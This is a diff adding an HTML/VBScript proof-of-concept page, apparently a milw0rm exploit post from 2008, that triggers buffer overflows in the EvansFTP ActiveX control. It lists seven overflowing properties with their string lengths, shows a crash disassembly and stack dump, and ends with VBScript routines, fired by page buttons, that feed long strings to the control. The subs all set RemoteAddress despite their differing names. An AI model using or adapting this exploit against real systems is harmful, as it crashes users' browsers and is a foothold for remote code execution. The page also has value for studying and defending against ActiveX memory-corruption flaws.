@@ -1,0 +1,98 @@
+<HTML>
+<package><job id='DoneInVBS' debug='false' error='true'>
+<object classid='clsid:7E864D3E-3E6A-48F0-88AF-CEAEE322F9FD' id='beard' />
+<HEAD>
+  <TITLE>EvansFTP (EvansFTP.ocx) Remote Buffer Overflow PoC</TITLE>
+</HEAD>
+<BODY>
+[+] Application : EvansFTP ActiveX <br>
+[+] CompanyName    : Evans Programming <br>
+[+] Description    : Multi-threaded asynchronus Active-X FTP Control<br>
+[+] Lib GUID    : {DA3C77F4-8701-11D4-908B-00010268221D}<br>
+[+] Exploit     : Remote BoF (PoC)<br>
+[+] Author      : Bl@ckbe@rD // Blackbeard-sql{a.t}Hotmail{dot}fr<br><br>
+[+] Object Safety Report :<br>
+Report for Clsid: {7E864D3E-3E6A-48F0-88AF-CEAEE322F9FD}<br>
+RegKey Safe for Script: Faux<br>
+RegKey Safe for Init: Faux<br>
+Implements IObjectSafety: Vrai<br>
+IDisp Safe:  Safe for untrusted: caller,data  <br>
+IPStorage Safe:  Safe for untrusted: caller,data <br><br>
+RegKey Safe for Script: Faux<br>
+RegkeySafe for Init: Faux<br>
+KillBitSet: Faux<br>
+<br><br>
+The Proprieties (RemoteAddress,ProxyPrefix,ProxyName,Password,ProxyBypassList,LoginName,CurrentDirectory) suffers from Buffer Overflow when we pass long strings in fact : <br>
+1- RemoteAddress    suffers from a BoF when we pass a string over 2068  <br>
+2- ProxyPrefix      suffers from a BoF when we pass a string over 1044  <br>
+3- ProxyName        suffers from a BoF when we pass a string over 1044   <br>
+4- Password         suffers from a BoF when we pass a string over 1044   <br>
+5- ProxyBypassList  suffers from a BoF when we pass a string over 1044   <br>
+6- LoginName        suffers from a BoF when we pass a string over 1044   <br>
+7- CurrentDirectory suffers from a BoF when we pass a string over 1044   <br><br>
+DisASM RemoteAddress Crash :<br><pre>
+7C809EEC    MOV AL,[EDX]    (KERNEL32.dll)
+ 
+7C809ED4    TEST EDX,EDX
+7C809ED6    JE 7C80C858
+7C809EDC    LEA EDI,[EDX+EAX-1]
+7C809EE0    CMP EDI,EDX
+7C809EE2    JB 7C80C858
+7C809EE8    AND DWORD PTR [EBP-4],0
+7C809EEC    MOV AL,[EDX]      <--- CRASH
+ 
+EBP+8    FEEEFEEE
+Stack Dump:
+13FC18      A7 F3 01 66 EE FE EE FE 04 00 00 00 02 00 00 00
+ 
+</pre>
+<script language='vbscript'>
+Sub RemoteAddress
+arg1=String(2068, "A")
+beard.RemoteAddress = arg1
+End Sub
+ 
+Sub ProxyPrefix
+arg1=String(1044, "A")
+beard.RemoteAddress = arg1
+End Sub
+ 
+Sub ProxyName
+arg1=String(1044, "A")
+beard.RemoteAddress = arg1
+End Sub
+ 
+Sub Password
+arg1=String(1044, "A")
+beard.RemoteAddress = arg1
+End Sub
+ 
+Sub ProxyBypassList
+arg1=String(1044, "A")
+beard.RemoteAddress = arg1
+End Sub
+ 
+Sub LoginName
+arg1=String(1044, "A")
+beard.RemoteAddress = arg1
+End Sub
+ 
+Sub CurrentDirectory
+arg1=String(1044, "A")
+beard.RemoteAddress = arg1
+End Sub
+</script><br><br>
+ 
+<INPUT TYPE="button" VALUE="RemoteAddress PoC" ONCLICK=RemoteAddress()>
+<INPUT TYPE="button" VALUE="ProxyPrefix PoC" ONCLICK=ProxyPrefix()>
+<INPUT TYPE="button" VALUE="ProxyName  PoC" ONCLICK=ProxyName()>
+<INPUT TYPE="button" VALUE="Password PoC" ONCLICK=Password()>
+<INPUT TYPE="button" VALUE="ProxyBypassList PoC" ONCLICK=ProxyBypassList()>
+<INPUT TYPE="button" VALUE="LoginName PoC" ONCLICK=LoginName()>
+<INPUT TYPE="button" VALUE="CurrentDirectory PoC" ONCLICK=CurrentDirectory()><br><br>
+Brought to You by Bl@ckbe@rD<br>
+Peace xD
+ </BODY>
+</HTML>
+
+# milw0rm.com [2008-12-14]
